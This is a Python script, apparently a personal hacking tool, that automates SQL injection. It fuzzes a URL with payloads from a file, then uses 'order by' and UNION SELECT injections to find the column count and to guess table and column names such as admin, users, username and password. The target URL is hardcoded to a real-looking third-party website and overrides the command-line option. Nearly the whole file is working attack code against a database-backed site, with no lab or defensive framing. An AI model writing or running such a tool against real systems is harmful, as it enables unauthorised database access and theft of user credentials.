import optparse
import requests

parser = optparse.OptionParser()
parser.usage="sqlinjector.py -u url -i inject_fuzz.txt"
parser.add_option("-u",'--url',dest='url',help='url to test sql',action='store',type='string',metavar='URL')
parser.add_option('-i','--inject',dest='inject_file',help="fuzz fliename",action='store',type='string',metavar='FUZZFILE')
(options,args) = parser.parse_args()

url = options.url
fuzz_file = options.inject_file

url = 'http://ss.chaoxing.com/search?sw=1&x=0_1078'
fuzz_file = 'inject_fuzz.txt'

def get_urls():
    urls = []
    with open(fuzz_file,'r')as f:
        payload_list = f.readlines()    #每一项之后都有一个\n需要使用strip()去除
        for payload in payload_list:
            temp_url = url       #生成一个新的url，避免拼接内容后就
            payload = payload.strip()
            urls.append(temp_url.replace("FUZZ",payload)) #replace拼接内容，将前者替换为后者
        return urls


inject_urls = get_urls()
result_list = []    # 存储sql注入验证成功的url列表
is_injectable = []


def test_sql():
    print("testing url:")
    for item in inject_urls:
        r = requests.get(url=item)
        print(r.url)
        result = r.text
        if result.find("SQL syntax") != -1: #判断返回结果是否存在SQL syntax
            is_injectable.append(True)
            result_list.append(r.url)


test_sql()
if len(result_list) == 0:
    print("no sql inject")
else:
    print("*"*50)
    print("exist sql inject")
    for item in result_list:
        print(item)
print("*"*50)
#功能实现，发现注入点对应的数据表拥有的字段数，列表
def detect_column_num():
    i = 1
    while i < 100:
        i += 1
        temp_url = url.replace("FUZZ","1' order by " + str(i) + "--+")
        r = requests.get(temp_url)
        print(r.url)
        if r.text.find("Unknow") == -1:
            continue
        else:
            break
    return i-1


if len(is_injectable) > 0:
    column = detect_column_num()
    print("Find this table has "+str(column) + " " +  "column")

table_result = []
def detect_table_name():
    u = ""
    for i in range(column):     #从0开始循环到column最大值
       u = u + str(i+1)+","     #第一次i是0所以+1
    u = u[0:len(u)-1]
    table_list = ["admin","admin123","root","administrator","users","emails","referers","uagents"]
    key = "doesn't exist"
    for table_name in table_list:
        temp_url = url.replace("FUZZ","-1'+union+select+" + u + "+from+"+ table_name+"--+")
        r = requests.get(temp_url)
        if r.text.find(key) == -1:      #没有找到,则追加表名
            table_result.append(table_name)

if len(is_injectable) > 0 :
    detect_table_name()
    print('*'*50)
    print("Find this table_name in DB:")
    for table in table_result:
        print(table)

column_result = []
def detect_column_name():
    key = "Unknown column"
    u = ""      #获取字段
    for i in range(column):  # 从0开始循环到column最大值
        u = u + str(i + 1) + ","  # 第一次i是0所以+1
    u = u[0:len(u) - 1]
    column_content = ["id", "user", "admin", "username", "password", "users"]
    for table in table_result:
        for line in column_content:
            temp_url = url.replace("FUZZ","-1'+union+select+"+ u.replace("1",line) +"+from+"+table+"+--+")
            r = requests.get(temp_url)
            if r.text.find(key) == -1:      #未找到则追加列名
                column_result.append(line)
        else:
            column_result.append(table)     #[column,table]反之追加表名


if len(is_injectable) > 0:
    detect_column_name()
    print("*"*50)
    print("Find these column name:")
    for line in column_result:
        if line not in table_result:    #判断列名是否不存在列名列名列表中
            print(line)
        else:
            print("上边内容就是%s表对应的字段名: "%line)
